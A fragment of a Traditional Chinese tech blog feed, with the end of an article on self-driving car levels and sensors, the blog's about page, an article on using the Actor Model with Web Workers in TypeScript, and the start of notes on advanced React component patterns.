Level 0：沒有自駕、但會警告。舉例來說，裝有 Mobileye 的車子，車內會有螢幕顯示車道偏離警示（ Lane Departure Warning ）和前方碰撞警示（ Forward Collision Warning ）。此種車就是落在這個 Level。

Level 1：加減速、轉向一次一個。例如 Mobileye 針測到障礙物時自動煞車，或是針測到偏離車道時幫你調整方向盤。現在很多跟 Mobileye 合作的車廠就是這類型。

Level 2：加減速、轉向一次多個。至少有兩項控制能階調地自動化，例如一邊跟前車保持等速，又一邊維持在車道內。

Level 3： 一些情境下，可以完全不用人為操作，例如高速公路。不過現在搭載 Hardware-1 的 Tesla 在高速公路上使用 Autopilot 駕駛時還不能全程放手（ 要放手當然也是可以，但 Tesla 有免責聲明呦 ），如果能放手做自己想做的事，就符合 Level 3，目前姑且稱它 Level 2.5 吧。（ 事實上在 2016 年底 Tesla 跟 Nvidia 合作推出了新的硬體架構 Hardware-2，目標是在 2017 年底推出 Level 45 的全自駕技術。礙於版面配置和後段解說方便，~~Tesla 晚輩你就先在此文章待在 Level 23 好好反省吧，未來是你的！~~ ）

Level 4：除了一些特殊情境自駕車開不了，例如：大雨、下雪、強光、沒有超精細的 Map（ 後面會提 ）的地方，或是後面的警察叫你停下來，其它狀況此 Level 的自駕車都可以 Carry。

Level 5：Level 5 的車，駕駛要在車上做什麼都行（ &gt;&#x2F;&#x2F;&#x2F;&lt; ），車上也沒有方向盤。這也是 Google 的最終目標。


[ 自駕車是如何運作的 ]自駕車大概是怎麼運作的呢，以下將用上段 Level 表中提到的公司：Mobileye、Tesla、Google，從 Level 0~5 逐一介紹。
後裝市場的 Mobileye - Level 0![Mobileye Aftermarket](/img/mymykuo/mobileye-aftermarket.png)（ Photo Credit: [Mobileye][29]、[Mazda 5][30] ）

先從裝載 Mobileye 的 Level 0 自駕車來解釋。賣出去的車，裝上 Mobileye Sensor - EyeQ  Camera 的影像辨識處理器，再加上 EyeWatch 警報器，就可以完成下圖的警報功能：
![Mobileye Aftermarket Example](/img/mymykuo/mobileye-aftermarket-example.png)（ Photo Credit: [Mobileye][29] ）


前車碰撞警報 - 提醒駕駛踩煞車
車道偏移警報 - 提醒轉方向盤
高速公路監視警報  - 提醒離前車過遠，該加速了

雖然沒有自駕，需要人為操作，但有警報，所以符合 Level 0。
前裝市場的 Mobileye - Level 1![Mobileye Before Market](/img/mymykuo/mobileye-before-market.png)（ Photo Credit: [Mobileye][29]、[Mazda 5][30]、[CarPlay][31] ）

以下用 Mobileye 的前裝市場來解釋 Level 1。在汽車售出前，就會先裝好 Mobileye 的 Camera 作為 Sensor 或是別家廠商的 Camera，車裝主機再搭配 Mobileye 的影像辨識功能，就可以在影像辨識出不同狀況時，讓汽車自動加減速或轉方向盤。如下圖三種狀況：
![Mobileye Before Market Example](/img/mymykuo/mobileye-before-market-example.png)（ Photo Credit:  [Mobileye][29] ）


前車碰撞預防系統 - 影像辨識出快撞到前車了，汽車就自動減速
車道保持輔助系統 - 影像辨識出快偏離車道了，汽車就自動轉方向盤
車距控制巡航系統  - 影像辨識出離前車過遠，汽車就自動加速

但這個等級一次只能執行一個任務，沒辦法階段性的完成兩個任務。例如一邊開在車道又一邊開啟巡航系統，那是下一個等級 Level 2 做的事。
Tesla Autopilot - Level 2~3下個等級，也就是 Tesla 目前的等級 Level 2.5（ 上述有提到要能在高速公路完全放手才算是 Level 3 ）。它的自駕輔助系統名字是 Autopilot，在 2016 年底前搭載 Hardware-1 的 Autopilot 主要有三個功能：Autosteer、Auto Lane Change、Autopark，每個功能都可以階段性的完成兩個功能以上，舉例來說：

Autosteer - 可以一邊跟車，一邊保持在車道內。階段性的完成車距控制巡航系統（ Adaptive Cruise Control ）＋ 車道保持輔助系統（ Lane Keeping Assist ）。

Auto Lane Change - 讓車子可以自動換道，又可以避免撞到旁車。使用旁側碰撞預防系統（ Side Collision Avoidance ）＋ 盲點偵測系統（ Blind Spot Detection ）。

Autopark - 可以自動停車。使用停車區域偵測系統（ Parking Space Detection ）＋前&#x2F;旁側碰撞預防系統（ Forward&#x2F;Side Collision Avoidance ）。


此款 Autopilot 的這些功能除了自動停車以外，只能在高速公路上使用。能實現這些功能靠的是以下這些 Sensors：Radar、Camera、Ultrasonic Sensor。如下圖。
![Tesla Hardware-1 Sensors](/img/mymykuo/tesla-hardware1-sensors.png)（ Photo Credit: [Tesla][33] ）

Tesla 的車頭裝著 Radar，可以針測前車的位置和速度，在定速巡航時可以避免撞到前車；擋風玻璃上裝著 Camera，可以做許多電腦視覺處理，像是辨識行人、交通號誌、物體距離、道路白線，此款 Camera 在 Hardware-1 架構下是買 Mobileye 作為 Solution（ 2016 年底後的 Hardware-2 架構則是跟 Nvidia 合作 ）；12 個超聲波的 Sensors 均勻的裝在汽車底部，針測範圍大概 5 公尺，主要是為了防撞，還有偵測盲點和停車位。
來看一下 Tesla 官方釋出的 Demo 影片吧！


影片幾個重點如下：

操作桿壓兩下就開啟 Autosteer 定速巡航
巡航時會跟著車道轉彎，不會偏移車道
想要換車道的話打個方向燈就好，Tesla 就會自動換道
超聲波會偵測停車空間，按下按鈕後就會自動停車

Google Waymo - Level 4~5介紹完 Tesla 後，再來介紹一下目標最遠大，想做全自動駕駛車的 Google。其自駕車名稱為 Waymo，因 Google 日前將自駕車部門拆分出來成立了獨立公司。
想做到這類型的自駕車，主要需要以下功能：

**超精細的 Map ** - 只有現今 Google Map 的資訊對於全自動駕駛車是完全不夠的，地圖必須精細到清楚市區上的道路、十字路口、斑馬線有多寬，還要知道紅綠燈、交通號誌、人行道、消防栓在哪，以及他們的高度等等。

![Detailed Map](/img/mymykuo/detailed-map.png)（ Photo Credit: [Google][38] ）


精準的定位系統 - 有了精細的地圖，還必須搭配精準的定位系統，才能讓自駕車無誤差地行駛在一般道路上。另外因為 GPS 有誤差，無法確切的知道車子現在在哪個線道，此精準定位系統必須搭配其它 Sensor 幫忙。

物體偵測和辨識 - 一般道路上相對於高速公路會碰到更多的障礙物，像是行人、機車、汽車、腳踏車，還有動物，還要知道什麼時候紅燈，什麼時候綠燈等等，這些都需要物體偵測和辨識的功能。

路徑規劃 - 單單只有讓車子維持在白線內是完全不夠用的，例如遇到坑洞、路障、道路施工的時候要繞開，或是提早閃避要開門的汽車。


再來看一下實現這些功能 Waymo 需要裝哪些 Sensor 吧！
![Waymo Sensors Architecture](/img/mymykuo/waymo-sensors-architecture.jpg)（ Photo Credit: [WIRED][39] ）


Lidar - Waymo 跟 Tesla 最主要的差別是在於 Waymo 車頂裝了 Lidar。除了可以幫忙建超精細的 3D Map  外，還可以感應到方圓 100 公尺內物體的方位、角度、距離。

Video Cameras - 因為有超精細的 3D Map，所以 Camera 不太需要偵測道路白線，主要用來辨識紅綠燈和輔助其它 Lidar 做不到的事。

Radar Sensors - 偵測障礙物以及避免碰撞。

Central Computer - 分析所有 Sensors 傳過來的 Input，規劃出要走的路徑和決定自駕車方向盤轉向、加減速。

Odometry Sensors - 輔助 GPS 的側距 Sensors，讓汽車能更精準的定位在超精細的 3D Map 上

Ultrasonic Sensors - 盲點偵測以及停車位偵測。

GPS - 結合轉速計、測高儀、迴轉儀的資訊來提供更精準的定位。


這些 Sensor 中，最貴的就是車頂上的 Lidar，最貴可以到 8000 美金（ ~&#x3D; 4856份營養午餐 ）。
大家目前比較有印象的應該是下面這台原型車，車上裝的 Sensor 跟上一張圖差不多，主要的差別是原型車上沒有方向盤，因為目標是實現 Level 5 的全自動駕駛車。
![Waymo Prototype](/img/mymykuo/waymo-prototype.jpg)（ Photo Credit: [Waymo][40] ）

一樣來看一下 Waymo 官方釋出的 Demo 影片吧！


影片幾個重點如下：

黑白不動的部分就是超精細的 Map，紫色就是透過 Lidar 偵測到的物體
辨識到路障時進行道路規劃然後閃避它
針測到路邊障礙物時進行道路規劃然後閃避它
辨識到鐵路柵欄時，小心翼翼地等前一台車離開後才繼續開
辨識到腳踏車和他的手勢時，調整車速並改變方向

Tesla vs Google最後我們來比較一下搭載 Hardware-1 的 Tesla 和 Google Waymo。因為主要感知環境的方法不同，大家也把它看作是 Camera 和 Lidar 的輸贏。
![Tesla vs Google](/img/mymykuo/tesla-vs-google.png)


自駕等級 - 自駕等級分別是 23 和 45。
超精細 Map - Tesla 沒有超精細 Map 而 Google Waymo 有，所以一個只能在高速公路使用，另一個已經能在一般道路上開。
主要的 Sensor - 感知環境的 Sensor 主要是 Camera 和 Lidar。
Sensor 的花費 -  Lidar 目前非常貴，而且 Waymo 還需要額外的定位 Sensor。
Sensors 感應半徑 - 讓汽車前後左右都能感知環境，Tesla 前面是靠 Camera，但左右和後面是透過超聲波，半徑只能到 5 公尺左右，而 Waymo Lidar 的半徑則能到 100 公尺左右。
Sensor 解析度 - Camera 的解析度很高，而 Lidar 出來的影像雖然是 3D 資訊，但解析度卻不高。
CPU - Camera 的高解析度造成 Tesla 主機的 CPU 在解析 Camera 影像時會需要更大的運算量。

光看這樣好像會覺得 Google Waymo 的解法除了 Lidar 比較貴無法接受以外（ 最近 Lidar 還降低成本了呢 ），根本大勝！但 Google Waymo 目前還無法推行有一個很大的原因，因為建立超精細的 3D Map 非常耗時，維護也需要很大的成本。
從前面的文章大家應該可以察覺到自駕車運用 Sensor 感知周遭環境一切事物的重要性，而我個人覺得 Sensor 想做的事跟獵人的高等應用技 &lt; 圓 &gt; 很像，在圓內可以感知一切物體的形狀和動作。
![HunterXHunter Circle](/img/mymykuo/hunterXhunter-circle.png)（ Photo Credit: HunterXHunter ~~要復刊了耶耶~~ ）

舉例來說，我認為目前 Hardware-1 的 Tesla 就是獵人裡的信長，而 Google Waymo 就是奇犽他爺爺。
![HunterXHunter 4m Tesla](/img/mymykuo/hunterXhunter-4m-tesla.png)
 ![HunterXHunter 100m Google](/img/mymykuo/hunterXhunter-100m-google.png)（ Photo Credit: HunterXHunter ~~但結局還是燒給我嗚嗚~~ ）

[ 總結 ]這篇文章主要是我 2016 年時的觀察，有些地方可能跟現今自駕車的產業有些出入，但畢竟這產業瞬息萬變，不只上述提到的大公司，許多新創小公司（ Drive.ai、Comma.ai、nuTomomy、OTTO ）也搶著擠進這還算藍海的產業。
五年後自駕車 Level 0~5 的排名有很大的機率就會打臉我上面整理的等級表，也許 Mobileye + Intel + BMW 會先實現全自動駕駛車，也許是 Tesla + Nvidia，也許依舊是 Google Waymo，其它公司都是快樂夥伴。Who knows！（ 曾經精準預測 AMD 大漲的 obov 倒是有在 PTT 留言開示 ）就繼續觀察下去吧！
總之希望觀察到這篇文章的讀者能略懂：

Why - 為什麼自駕車很重要呢 - 救命、省時、賺大錢
What - 什麼是自駕車 - 能感知環境、不需人類操作、有 0~5 個等級
How - 自駕車是如何運作的 - 用 Sensor 偵測和辨識物體、決策加減速和轉向

有機會、有時間的話之後再聊聊：

Deep Learning 為什麼在自駕車中扮演關鍵角色
自駕車產業目前和未來有什麼難題要克服
自駕車未來的商業模式

就這樣啦，以上只是我的觀察啦，掰！
關於作者：@mymykuo 一個嘴賤但中肯、瑣事觀察系、跳嘻哈的偽陽光真宅軟體工程師
]]></content>
      <tags>
        <tag>自駕車</tag>
        <tag>Self-Driving Car</tag>
        <tag>鄉民看科技</tag>
      </tags>
  </entry>
  <entry>
    <title>關於這個技術共筆部落格</title>
    <url>/2016/03/19/about/</url>
    <content><![CDATA[TechBridge Weekly 技術週刊團隊是一群對用技術改變世界懷抱熱情的團隊。本技術共筆部落格初期專注於Web前後端、行動網路、機器人&#x2F;物聯網、數據分析與產品設計等正體中文技術原創文章或國外好文翻譯分享。This is TechBridge Weekly Team Tech Blog, which focus on web, mobile, robotics, IoT, data analytics technology sharing.

技術日報：http://www.techbridge.cc/
技術週刊：http://weekly.techbridge.cc/
技術共筆部落格：http://blog.techbridge.cc/
粉絲專頁：https://www.facebook.com/techbridge.cc/
電子郵件：techbridge.cc@gmail.com

目前負責的 Curator
@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校
@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
@huli 野生工程師，相信分享與交流能讓世界變得更美好
@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力

]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>Mobile</tag>
        <tag>Web</tag>
        <tag>Startup</tag>
        <tag>Data</tag>
        <tag>Robotics</tag>
        <tag>Maker</tag>
        <tag>UI/UX</tag>
        <tag>Product</tag>
      </tags>
  </entry>
  <entry>
    <title>46 年老技術與 Web 的新火花 - Actor Model in Web</title>
    <url>/2019/06/21/actor-model-in-web/</url>
    <content><![CDATA[前言在今年的 Google I&#x2F;O 2019 中，@Surma, @Jake 與 @Mariko 推出了一款能在低階的 feature phone 上運作順暢的 web app - PROXX，其中利用到了 Web worker 來分擔許多 Browser main thread 中的工作，讓畫面渲染可以更順暢，也因此讓我注意到去年在 Chrome dev summit 2018 中的一支影片 - Architecting Web Apps - Lights, Camera, Action!，讓我眼睛為之一亮，裡面講到他們利用 Actor Model 來將關注點分離，不同的 Actors 各自負責不同的工作，彼此之間用共通的介面溝通，如此一來，除了將複雜的運算邏輯放入 Web worker 外，由於架構上的特性，理論上也能很方便的抽換 View 的實作方式，像是一套 web app，可以在不重寫所有邏輯的情況下，從 Vue 實作 view，轉換到以 React 實作。
聽起來非常合理，而有趣的是，這個 Actor Model 其實早在 46 年前就被提出，也有應用在 Web 領域上過，像是用 Scala 撰寫 的 Akka，或是在電信通訊上有名的 Erlang，但是在前端上似乎是第一次被提出來。
今天透過這篇文章來了解一下這個 46 年前就存在的觀念是什麼，而又能如何與 Web 前端整合呢！
Actor Model 介紹Actor Model 是一個關於 concurrent computation 的 conceptual model，在 1973 年最早被提出時，只是一個概念模型，用來抽象化並行處理程序的複雜程式，直到 1985 才被延伸出一個完整的 Actor model theory，有興趣可以到 wiki 查看。
而為什麼會需要提出 Actor Model 來處理 concurrent issue 呢？
歷史上的前因後果在這個影片中的前半段解釋得蠻清楚的 [COSCUP 2011] Programming for the Future, Introduction to the Actor Model and Akka Framework
大體上是說，由於 CPU 的製程是有其極限存在，已經無法保證 Moore’s Law 會持續下去，取而代之的是用多核心來提高處理器內的電晶體數量，透過多核心的並行處理來提高運算速度，而平行處理對於撰寫程式的我們來說，就是很複雜的一個存在，因為我們有 Shared mutable state，造成 race condition、dead lock 等等的 issue 需要避免，而 Actor Model 就是因應而生的解決方案之一。
Actor Model 主要有幾個特點：

輕量物件: Actor 是系統內的一個基礎單位，每個 Actor 只負責自己的工作，所以可以很輕量。

沒有 shared state：每個 Actor 各自管理自己的 state，跑在各自的 thread 上，不共享 memory 與 state。

透過 message 溝通：每個 Actor 會有一個 message queue，或稱作 mailbox，接收到的訊息會在此排隊等著依序執行。


一個 Actor 的架構略如下圖：

每個 Actor 都有自己的 private state，別的 Actor 沒辦法直接更動你的 state，降低了因為 shared state 產生的問題。
我們拉遠一點來看，Actor 運行在不同的 Thread 中，彼此之間透過 Message 來溝通，收到訊息後各自決定要採取什麼樣的對應動作，而更改的都只會是自己的 private state，沒有 share memory，彼此之間是互相獨立的。

而在操作上，每個 Actor 只被允許做下面三種 operation：

創建另一個 Actor
傳送 Message
指示該如何處理下一個 Message

前面兩種很好理解，但第三個就蠻有趣的了，舉例來說，假設有個 Counter Actor A，一直以來都是會把接受到的 Message 數字累加到自己的 counter state 中，但今天可以有另一個 Actor B 傳遞訊息跟 Actor A 說：『hey, 你這次先不用累加數字了，但是下一個傳進來的訊息，你要乘以 2 以後再放到計數器內喔』。

這個三個特性合再一起時，有個很大的好處：容錯系統。
一個 Actor 對於他創建的 Actor 可以擁有 supervisor 的權限，可以告訴其管控的 Actor 說：『如果你 crash 了，至少死前丟給我個訊息跟我說』，然後當 Supervisor Actor 收到 Actor 死亡訊息時，可以再傳送 “restart” Message 去重啟 Actor，這樣的能力造就了一個 Self-healing systems：

看到這邊會發現，雖然 Actor model 是因為 concurrent computation 而提出的，但其特性用在分散式系統上也是非常合適的，每個 Actor 跑在不同的 thread 上，當然也可以是不同的遠端環境上，並透過統一個 Message 介面溝通。
運用到 Web 前端上在瀏覽器的世界中，也是存在有多種 Process 與 Context（推薦閱讀 @Mariko 的這篇瀏覽器深入淺出介紹)，像是負責渲染的 UI Process，而在 DOM 外的 web worker 則是另一個獨立的 Worker Process，就想是一個縮小版的分散式系統，Worker Process 沒辦法直接存取 UI Process 所控制的 DOM 元件，相對的 UI Process 也無法直接呼叫 Worker Process 中所存在的函式。
照著這樣的邏輯梳理下來，Web 前端真的是蠻適合套用 Actor Model 的，就像我們有個 UI Actor 運行在 UI Process，同時負責控制狀態的 State Actor 運行在 Worker Process，彼此之間透過 Message 來溝通。
透過 Actor Model 來切割 UI 與 State 的關係，只要處理得當，理論上我們能夠讓一套相同商業邏輯的 Web app，輕易地從普通的 Web 轉換成 3D 版本，或是 Web VR 版本。
更棒的是，將關注點分離成各種 Actor 後，code splitting 變得更自然更容易了，每個 Actor 都能夠在需要的時候再載入即可。
Web 應用的範例說了這麼多，來看點實際的例子！
既然這個概念是 Google engineer 在他們的開發大會展示的，勢必有 Demo code 可以看，這套叫做 actor-boilerplate 的 repository 包含了 actor-helper 來幫忙 cover 了 Actor Model 與 Messaging system 的實作細節，讓我們能輕易的體驗 Actor Model 運用在 Web Frontend 的感覺。
我們做個簡單的基礎代謝率(BMR)計算器來感受一下。
先看一下成果：

UI 上就是簡單幾個 input 欄位而已，按下按鈕後，取出使用者輸入的值進行計算，最後顯示結果。這段流程我們可以拆分成兩個 Actor 來完成，分別是控制 UI 的 UI Actor 與更動 State 的 State Actor。（仔細看上方的 gif 的話，可以看到 State Actor 其實是運行在 Worker process 上的。
接著我們先來看看 UI Actor 長什麼樣子，關鍵的程式碼在下面這幾行（順帶一提，因為 action-boilerplate 本身就是以 TypeScript 實作，因此接下來範例也是 TypeScript）：
import &#123; Actor, lookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;export default class UiActor extends Actor&lt;Message&gt; &#123;  private state = lookup(&quot;state&quot;);  private resultEl = document.getElementById(&quot;result&quot;) as HTMLSpanElement;  private getInputVal = () =&gt; &#123;    // gender    const genderEl = document.getElementById(&quot;gender&quot;) as HTMLSelectElement;    const genderVal = genderEl.value;    // height, weight, age 依此類推...    return &#123;      gender: genderVal,      height: heightVal,      weight: weightVal,      age: ageVal,    &#125;  &#125;;  async init() &#123;    const calculateButton = document.getElementById(      &quot;Calculate&quot;    ) as HTMLButtonElement;    calculateButton.onclick = () =&gt;      this.state.send(&#123;        type: StateMessageType.CALCULATE,        value: this.getInputVal()      &#125;);      //...略  &#125;  async onMessage(msg: Message) &#123;    this.resultEl.textContent = `$&#123;msg.state.result&#125;`;  &#125;&#125;

首先從 actor-helpers 中取出 Actor 物件來繼承，實作兩個主要函式：init() 與 onMessage()：

init()：負責在初始時與 DOM 元件建立關係，綁定 event handler，當事件觸發時傳遞訊息給 State Actor。
onMessage():就像是接收 postMessage 傳送的訊息一般，actor-helpers 幫我們串接好訊息溝通這段，在這 onMessage() 中，可以接收到其他 Actor 傳送過來的訊息。

在 init() 中的 this.state 是什麼呢？為什麼他可以 send message？
那是我們利用 actor-helpers 提供的 lookup 函式，將 State Actor 綁定到創建的私有變數上，這樣就能使用 send 來傳送訊息。
接著我們來看看 State Actor：
import &#123; Actor, lookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;// lots of Type definitions...// ...略export default class StateActor extends Actor&lt;Message&gt; &#123;  private ui = lookup(&quot;ui&quot;);  private state: State = &#123;    result: 0  &#125;;  async onMessage(msg: Message) &#123;    switch (msg.type) &#123;      case MessageType.CALCULATE:        const &#123;          weight,          height,          age,          gender        &#125;: BMRParams = msg.value;        // Do the math        this.state.result = bmr;        break;      case MessageType.RESET:        this.state.result = 0;        break;    &#125;    this.ui.send(&#123;      state: this.state    &#125;);  &#125;&#125;

跟 UI Actor 大同小異，繼承 Actor 並利用 lookup 綁定 UI Actor 到私有變數上，在 onMessage() 中，根據接收到的 Message Type 來執行對應動作，並更改自身的 state，再將 Result Message 傳回給 UI Actor。
透過 action-helps，實作 Actor 變得方便許多（當然也是因為這是很簡單的例子…）。
不過還沒結束，Actor 都有了以後，我們要怎麼使用呢？
我們要準備兩個特殊的檔案，bootstrap.ts 與 worker.ts：
import &#123; hookup, initializeQueues &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;import UiActor from &quot;./actors/ui.js&quot;;async function bootstrap() &#123;  await initializeQueues();  hookup(&quot;ui&quot;, new UiActor());  const worker = new Worker(&quot;worker.js&quot;);  // This is necessary in Safari to keep the worker alive.  // 相關討論可以看 repo 內的 issue https://github.com/PolymerLabs/actor-boilerplate/issues/13  setInterval(() =&gt; &#123;    worker.postMessage(&quot;&quot;);  &#125;, 3000);&#125;bootstrap();

顧名思義，bootstrap.ts 負責啟動整個專案，透過 hookup 載入 UI Actor，並且 new 出一個 worker 來運行我們的 State Actor。
initializeQueues 主要是在程式執行前，清空目前瀏覽器的 Message queue，該函式的程式碼也就一行 await messageStore.popMessages(&quot;*&quot;);。
而 worker.ts 的內容更簡單：
import &#123; hookup &#125; from &quot;actor-helpers/src/actor/Actor.js&quot;;import StateActor from &quot;./actors/state.js&quot;;hookup(&quot;state&quot;, new StateActor());

就是 hookup State Actor！
最後在你的 html 上加入 bootstrap.ts 即可，這樣我們就完成了一個以 Actor Model 為基礎架構的 Web app！
完整程式瑪可從此參考。
結論Actor Model 雖然有了 actor-helps 的幫忙，實作上來說已經簡易很多，但任何操作都要透過 Message 的實作方式在前端應用上恐怕還是不好被接受，可能也因為如此，actor-boilerplate 其實在去年 Chrome dev summit 結束後似乎就沒再更新了 XD
不過我個人是蠻喜歡這個想法的，之後有機會再來真的實作一個不同 View 但使用同樣 State 的 Web app 看看！
另外，我也發現到，Web worker 雖存在已久，但是使用上的限制，讓一般我們在開發上很少會去考慮他，但這幾年看來，像是 AMP 等等的出現，發現 Google 似乎在推廣一個概念，就是 User experience first，Developer experience second，Developer 擅長處理複雜的事情，既然如此，我們應該專注在提供使用者最佳使用體驗上，而犧牲一點開發體驗。
如果你的 Web app 有複雜運算的需求，就試試看用 Actor Model 來將複雜的邏輯丟給在 Worker process 的 Actor 處理吧！
資料來源
Lights, Camera, Action!
actor-boilerplate
[COSCUP 2011] Programming for the Future, Introduction to the Actor Model and Akka Framework
wiki - Actor Model
Inside Browser

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>web worker</tag>
        <tag>google chrome</tag>
        <tag>architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>進階 React Component Patterns 筆記（下）</title>
    <url>/2018/07/21/advanced-react-component-patterns-note-II/</url>
    <content><![CDATA[前言上次我們介紹了三種 Rect Component Patterns，包含 Compound component、Render props component 與 Prop collections &amp; getters，而今天要繼續往下介紹剩下的五個 Patterns:

State Initializers
State Reducer
Control Props
Provider
Higher-order component

若對前三個 Pattern 不熟悉，或是沒看過上一篇文章的可以移駕至 進階 React Component Patterns 筆記（上）
接下來的 Pattern 都會延續之前的 Demo 範例，所以建議先閱讀過上篇！
此外，每個 Pattern 的最後都放有 codesandbox 的 demo link，覺得文字太多的可以直接去看完整的 code 喔！
State Initializers有時候我們會希望能讓元件回復到初始狀態，或是能讓使用者自己定義初始狀態，這時就適合採用 State initializer 技巧。
首先，我們利用自定義的 initialState 來存放元件初始狀態，而在真正的 state 中去 reference 它：
class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;;  initialState = &#123; on: false &#125;;  state = this.initialState;  // ...other function&#125;

這樣一來，要實作 reset 函式就相當簡單了：
reset = () =&gt;  this.setState(this.initialState, () =&gt;    this.props.onReset(this.initialState)  );

而要讓使用者能自定義元件初始狀態的方式，相信多數讀者都有用過，也就是讓使用者透過 props 來定義元件的 initial state：
class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125;, initialOn: false &#125;;  initialState = &#123; on: this.props.initialOn &#125;;  state = this.initialState;  // ...other function&#125;

由於並不是所有使用者都會自行定義初始狀態，所以別忘了在 defaultProps 中宣告我們自己希望的初始值喔！
Demo link
上面的 Demo 範例是延續上篇提到的 Prop collections &amp; getters 與 Render props，所以這邊加入的 reset 按鈕要記得加入 getStateAndHelpers 中傳遞給 render props 中的 children 使用。
State ReducerState Reducer 是一個蠻有趣的概念，主要目的是讓使用者能夠介入元件狀態改變的行為，讓元件在每次的 setState 時，都能夠被使用者影響。
舉個簡單的範例，像是我們先前的 Toggle component，如果今天使用者提出個需求，想要讓這個元件只能被 toggle 三次，那我們該怎麼做呢？
你當然可以讓使用者多傳一個 props 控制次數，然後在內部更動狀態時去檢查有沒有超過那個次數：
class Toggle extends React.Component &#123;  static defaultProps = &#123;    onToggle: () =&gt; &#123;&#125;,    onReset: () =&gt; &#123;&#125;,    initialOn: false  &#125;;  // 元件內部多一個 toggleTimes 來控制目前的 toggle 次數  initialState = &#123; on: this.props.initialOn, currentToggleTimes: 0 &#125;;  state = this.initialState;  reset = () =&gt;    this.setState(this.initialState, () =&gt;      this.props.onReset(this.initialState)    );  toggle = () =&gt; &#123;    // 每次 toggle 時判斷有沒有超過使用者定義的 toggle 次數上限    if (this.state.currentToggleTimes &gt;= this.props.toggleTimes) &#123;      console.log(&#x27;toggle too much&#x27;)      return;    &#125;    this.setState(      (&#123; on &#125;) =&gt; (&#123;        on: !on,        currentToggleTimes:this.state.currentToggleTimes + 1 &#125;),      () =&gt; this.props.onToggle(this.state.on),    );  &#125;  // ...other methods&#125;

但你也知道使用者的需求總是會變動，假如他突然間也想控制 reset 的次數怎麼辦? 你的程式不就改不完？
這時我們就能採用 State Reducer，先看一下使用者應該會怎麼使用 State Reducer：｀
class App extends React.Component &#123;  initialState = &#123; timesClicked: 0 &#125;  state = this.initialState  toggleStateReducer = (state, changes) =&gt; &#123;    // state 為 Toggle 的 current state    // changes 為該次 Toggle 動作所造成的改變    if (this.state.timesClicked &gt;= 4) &#123;      return &#123; ...changes, on: false &#125;    &#125;    return changes  &#125;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle          initialOn=&#123;true&#125;          onToggle=&#123;on =&gt; &#123;            this.setState((&#123; timesClicked &#125;) =&gt; (&#123;               timesClicked: timesClicked + 1,             &#125;))          &#125;&#125;          onReset=&#123;initialState =&gt; this.setState(this.initialState)&#125;          stateReducer=&#123;this.toggleStateReducer&#125;        &gt;          &#123;(&#123; on, getTogglerProps, reset &#125;) =&gt; (            // render props          )&#125;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

我們讓使用者傳入一個 stateReducer，其中接受兩個參數，一個是 Toggle component 的 current state，另一個是該次 Toggle component 執行 setState 時，所接受的變化 changes，而回傳值就是 Toggle component 實際 setState 時所接受的 change object。
因此在這個函式中，使用者就擁有了一個機會能夠在元件真正觸發 setState 之前，進行一些操作，以剛剛例子來說，就能在這邊判斷使用者自己紀錄的 state(timesClicked) 有沒有超過某個值，如果超過了，那我們之後每次的回傳結果中，都會將 on 這個 state 設為 false。
那元件本身該如何讓 stateReducer 介入 setState 中呢？重點就在這段：
internalSetState(changes, callback) &#123;    this.setState(currentState =&gt; &#123;      // 確認傳入的 changes 是單純的物件，或是函式      const changesObject =        typeof changes === &#x27;function&#x27; ? changes(currentState) : changes      // 呼叫使用者傳入的 stateReducer 來取得最終的 state change object      const reducedChanges =        this.props.stateReducer(currentState, changesObject) || &#123;&#125;      // 最後只是檢查一下 changes 是否為空，避免重複 render      return Object.keys(reducedChanges).length        ? reducedChanges        : null    &#125;, callback)  &#125;

我們需要建立一個介面與原本 setState 相同的 internalSetState 的方法，取代原本的 setState。
其中需要注意的有兩點，一個是原本的 setState 是能接受函式當第一個參數的，因此我們需要先判斷 changes 是否為 function，才能繼續進行其他動作。
另一個則是並非所有的 setState 都一定要用 internalSetState 取代，像是 reset function 我們可能不太希望使用者能介入，應該要很明確的 reset 所有狀態，因此這邊可以用原本的 setState。
看看 Demo Link ，並實際玩玩看會更清楚！
另外，在 Kent C. Dodds 的 workshop 中，他在 internalSetState 的實作上有提到一種他比較偏好的寫法：
internalSetState(changes, callback) &#123;    this.setState(currentState =&gt; &#123;      return [changes]        .map(c =&gt; typeof c === &#x27;function&#x27; ? changes(currentState) : c)        .map(c =&gt; this.props.stateReducer(currentState, c) || &#123;&#125;)        .map(c =&gt; Object.keys(reducedChanges).length ? c : null)[0]  &#125;

透過硬轉成 array 後，再用 map 將每個步驟 chain 起來，的確比較乾淨跟簡單，但比起原本做法沒那麼直覺就是了，尤其是最後還要取 [0] 出來，但參考一下也不錯！
透過 State Reducer，不僅使用者開心（能夠介入元件 state 的更動），開發者也不用疲於奔命一直改 code（讓使用者自己處理 reducer 實際內容），但壞處就是你需要呼叫一個 internalSetState 的函式，蠻可能造成 trace code 上的困擾，算是個 trade-off。
Control Props除非你從來沒有用 React 開發與表單相關的 component，否則你一定用過 Control Props，因為所謂的 Control Props 其實就是 Controlled component 的一種實作。
舉例來說，Select, Input 等 Form 的元件，當使用者輸入值時，其改變的是元件的內部狀態，該狀態通常綁定在 value 這個屬性上頭。
若在 React 中想要取得使用者輸入進表單元件的值時，你就會想要將 state 綁定在元件的 value 上頭，然而，一但你傳值給 value（也就是 value=&#123;this.state.value&#125;），你就必須要自己利用 handler 去控制它的狀態改變，否則使用者再怎麼輸入，都不會改變其狀態。因為在你傳值給 value 的時候，這個元件就已經歸你控制了，這樣的方式可以保證該元件內部狀態是 single source of truth，不會有使用者的輸入與你的 state 不一致的狀態發生。（關於 Controlled component 在 React 官方網站有詳細的介紹）
